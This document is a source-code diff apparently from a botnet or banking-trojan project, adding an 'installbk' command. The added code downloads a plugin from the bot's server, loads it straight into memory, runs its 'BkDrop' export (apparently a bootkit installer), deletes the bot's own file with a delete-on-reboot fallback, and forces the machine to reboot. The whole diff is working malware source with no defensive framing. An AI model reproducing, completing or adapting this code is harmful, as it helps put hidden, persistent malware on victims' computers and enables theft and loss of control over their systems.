@@ -9,6 +9,7 @@
 #include "Task.h"
 #include "md5.h"
 #include "KillOs_Reboot.h"
+#include "DllLoader.h"
 
 //---------------------------------------------------------------------------
 
@@ -830,6 +831,7 @@ LPBYTE Plugin::DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR Cac
 }
 //---------------------------------------------------------------------------
 const char* Plugin::CommandUpdatePlug = "updateplug";
+const char* Plugin::CommandInstallBk  = "installbk";
 
 
 bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
@@ -910,4 +912,87 @@ bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	if (CacheFileName) STR::Free(CacheFileName);
 
 	return false;
+}
+
+void BotSelfRemove()
+{
+	BOT::Unprotect();
+
+	PCHAR BotPath = BOT::GetBotFullExeName();
+	PDBG("BotSelfRemove", "Lookup bot file '%s'", BotPath);
+	
+	DWORD attr = (DWORD)pGetFileAttributesA(BotPath);
+	PDBG("BotSelfRemove", "'%s' attributes 0x%X", BotPath, attr);
+	if (attr == INVALID_FILE_ATTRIBUTES) return;
+	
+	PDBG("BotSelfRemove","Trying to delete file '%s'", BotPath);
+	pSetFileAttributesA(BotPath, FILE_ATTRIBUTE_ARCHIVE);
+	if (!(BOOL)pDeleteFileA(BotPath))
+	{
+		PDBG("BotSelfRemove","DeleteFile failed (%u). Try pending remove.",(DWORD)pGetLastError());
+		pMoveFileExA(BotPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+	}
+	STR::Free(BotPath);
+}
+
+void AsyncInstallBk(void* Arguments)
+{
+	PCHAR PlugName = (PCHAR)Arguments;
+	STR::AnsiLowerCase(PlugName);
+
+	PDBG("AsyncInstallBk", "Started with '%s'", PlugName);
+
+	DWORD  BkInstallPlugSize = 0;
+	LPBYTE BkInstallPlug = Plugin::DownloadEx(PlugName, NULL, &BkInstallPlugSize, true, false, NULL);
+	PDBG("AsyncInstallBk", "Download() return body=0x%X size=%d", BkInstallPlug, 
+		BkInstallPlugSize);
+
+	do
+	{
+		PDBG("AsyncInstallBk", "check is plug loaded from network");
+		// Проверяем загрузился ли плаг
+		if (BkInstallPlug == NULL) break;
+
+		// Проверяем формат (PE)
+		PDBG("AsyncInstallBk", "check file from network for PE");
+		if (!IsExecutableFile(BkInstallPlug)) break;
+
+		HMEMORYMODULE Module = MemoryLoadLibrary(BkInstallPlug);
+		PDBG("AsyncInstallBk", "MemoryLoadLibrary() result=0x%X", Module);
+		if (Module == NULL) break;
+
+		typedef BOOL (WINAPI *BkDropFunction)();
+
+		BkDropFunction BkDrop = (BkDropFunction)MemoryGetProcAddress(Module, "BkDrop");
+		PDBG("AsyncInstallBk", "MemoryGetProcAddress('BkDrop') result=0x%X", BkDrop);
+		if (BkDrop == NULL) break;
+
+		PDBG("AsyncInstallBk", "running BkDrop.");
+		BOOL BkDropResult = BkDrop();
+		PDBG("AsyncInstallBk", "BkDrop result=%d.", BkDropResult);
+
+		if (BkDropResult == FALSE) break;
+
+		PDBG("AsyncInstallBk", "Removing ring 3 bot version.");
+		BotSelfRemove();
+
+		PDBG("AsyncInstallBk", "Start machine reboot.");
+		Reboot();
+	}
+	while (0);
+
+	PDBG("AsyncInstallBk", "Finished.");
+	if (BkInstallPlug) MemFree(BkInstallPlug);
+	if (PlugName) STR::Free(PlugName);
+}
+
+bool Plugin::ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args)
+{
+	PDBG("ExecuteInstallBk", "'%s'", Args);
+
+	PCHAR PlugName = STR::New(Args);
+
+	StartThread(AsyncInstallBk, PlugName);
+
+	return true;
 }
